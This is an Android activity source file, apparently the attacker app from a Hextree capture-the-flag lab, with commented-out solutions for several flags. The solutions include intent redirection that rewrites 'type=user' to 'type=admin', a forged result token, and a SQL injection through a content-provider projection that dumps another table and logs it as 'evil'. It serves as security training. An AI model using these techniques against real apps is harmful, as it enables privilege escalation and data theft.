package com.example.attackerapp;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.Objects;

public class ReceiverActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_receiver);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        /* Flag 10
        Intent receivedIntent = getIntent();
        Log.d("Flag 10", Objects.requireNonNull(receivedIntent.getStringExtra("flag")));
         */

        /* Flag 11
        Intent returnIntent = new Intent();
        returnIntent.putExtra("token", 1094795585);
        setResult(1, returnIntent);
        finish();
         */

        /* Flag 12
        Intent returnIntent = new Intent();
        returnIntent.putExtra("token", 1094795585);
        setResult(1, returnIntent);
        finish();
         */

        /* Flag 22
        //Intent receivedIntent = getIntent();
        //Log.d("Flag 22", Objects.requireNonNull(receivedIntent.getStringExtra("flag")));
         */

        /* Flag 14
        Intent receivedIntent = getIntent();
        //receivedIntent.setAction("android.intent.action.VIEW");
        Log.d("Intent", receivedIntent.getData().toString());
        String url = receivedIntent.getData().toString();
        String modifiedUrl = url.replace("type=user", "type=admin");
        receivedIntent.setData(Uri.parse(modifiedUrl));
        receivedIntent.setComponent(new ComponentName("io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag14Activity"));
        startActivity(receivedIntent);
         */

        /* Flag 33.2
        Intent receivedIntent = getIntent();
        Cursor cursor = getContentResolver().query(
                Objects.requireNonNull(receivedIntent.getData()),
                new String[] {"title,content FROM Note UNION SELECT name,value"}, null,
                null, null
        );
        dumpUri(cursor);
         */
    }

    public static void dumpUri(Cursor cursor) {
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
}